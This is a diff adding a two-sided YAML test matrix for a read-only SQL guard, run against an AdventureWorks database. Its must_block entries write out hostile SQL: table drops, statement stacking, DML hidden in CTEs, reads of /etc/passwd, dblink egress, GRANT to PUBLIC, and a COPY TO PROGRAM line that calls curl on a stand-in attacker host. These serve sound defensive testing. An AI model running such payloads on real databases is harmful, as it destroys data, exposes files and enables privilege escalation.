@@ -1,0 +1,122 @@
+# Planted-fault matrix for the SQL guard. Two-sided on purpose.
+#
+# The must_block half is the obvious one. The must_allow half is the half people
+# skip, and it is the half that proves the guard is a guard rather than a mood:
+# a policy that rejects everything passes any one-sided test.
+#
+# Every must_allow query is valid AdventureWorks SQL and is executed for real
+# against the seeded database by run_evals.py, so "allowed" means "allowed and
+# actually runs", not merely "parsed".
+
+must_block:
+  - id: drop-table
+    sql: "DROP TABLE customer;"
+    reason: DDL
+
+  - id: statement-stacking
+    sql: "SELECT 1; DROP TABLE customer;"
+    reason: statement stacking; the second statement is DDL
+
+  - id: dml-in-cte-delete
+    sql: "WITH gone AS (DELETE FROM customer RETURNING *) SELECT * FROM gone;"
+    reason: >-
+      DML hidden inside a CTE. This is the case a regex allowlist misses: the
+      string starts with WITH, contains SELECT, and deletes the table.
+
+  - id: dml-in-cte-update
+    sql: "WITH x AS (UPDATE person.person SET firstname='a' RETURNING *) SELECT * FROM x;"
+    reason: same shape as dml-in-cte-delete, UPDATE instead of DELETE
+
+  - id: insert
+    sql: "INSERT INTO customer VALUES (1);"
+    reason: DML
+
+  - id: file-read
+    sql: "SELECT pg_read_file('/etc/passwd');"
+    reason: filesystem function
+
+  - id: dir-list
+    sql: "SELECT * FROM pg_ls_dir('/');"
+    reason: filesystem function in a table position
+
+  - id: copy-program
+    sql: "COPY customer TO PROGRAM 'curl attacker.example';"
+    reason: command execution
+
+  - id: select-for-update
+    sql: "SELECT * FROM customer FOR UPDATE;"
+    reason: acquires row locks, so not read-only
+
+  - id: dblink
+    sql: "SELECT dblink('dbname=x', 'SELECT 1');"
+    reason: network egress
+
+  - id: create-temp-table
+    sql: "CREATE TEMP TABLE t AS SELECT 1;"
+    reason: DDL
+
+  - id: grant
+    sql: "GRANT ALL ON customer TO PUBLIC;"
+    reason: privilege escalation
+
+must_allow:
+  - id: plain-select
+    sql: "SELECT firstname FROM person.person LIMIT 10;"
+
+  - id: cte-select
+    sql: "WITH t AS (SELECT * FROM sales.salesorderheader) SELECT count(*) FROM t;"
+
+  - id: window-fn
+    sql: "SELECT name, row_number() OVER (ORDER BY name) FROM production.product;"
+
+  - id: three-table-join-group-having
+    sql: >-
+      SELECT p.name, pc.name AS category, count(*) AS line_items
+      FROM sales.salesorderdetail AS sod
+      JOIN production.product AS p ON p.productid = sod.productid
+      JOIN production.productsubcategory AS ps
+        ON ps.productsubcategoryid = p.productsubcategoryid
+      JOIN production.productcategory AS pc
+        ON pc.productcategoryid = ps.productcategoryid
+      GROUP BY p.name, pc.name
+      HAVING count(*) > 50
+      ORDER BY line_items DESC
+      LIMIT 20;
+
+  - id: scalar-subquery-in-select-list
+    sql: >-
+      SELECT soh.salesorderid,
+             soh.totaldue,
+             (SELECT count(*) FROM sales.salesorderdetail AS sod
+               WHERE sod.salesorderid = soh.salesorderid) AS line_count
+      FROM sales.salesorderheader AS soh
+      LIMIT 25;
+
+  - id: union-all
+    sql: >-
+      SELECT businessentityid, 'employee' AS kind FROM humanresources.employee
+      UNION ALL
+      SELECT businessentityid, 'vendor' AS kind FROM purchasing.vendor
+      LIMIT 50;
+
+  - id: extract-and-date-filter
+    sql: >-
+      SELECT EXTRACT(YEAR FROM orderdate) AS yr,
+             EXTRACT(MONTH FROM orderdate) AS mo,
+             sum(totaldue) AS revenue
+      FROM sales.salesorderheader
+      WHERE orderdate >= DATE '2013-01-01'
+        AND orderdate < DATE '2014-01-01'
+      GROUP BY 1, 2
+      ORDER BY 1, 2;
+
+  # The two below are the mirror image of dml-in-cte: cases a regex denylist
+  # gets wrong in the *other* direction, by matching text that is not a
+  # statement. Both are ordinary read-only queries.
+  - id: ddl-keyword-inside-string-literal
+    sql: "SELECT 'DROP TABLE customer' AS harmless_text FROM person.person LIMIT 1;"
+    note: keyword appears in a string literal, not as a statement
+
+  - id: ddl-keyword-inside-comment
+    sql: "/* DROP TABLE customer */ SELECT count(*) FROM person.person; -- DELETE FROM x"
+    note: keyword appears only in comments
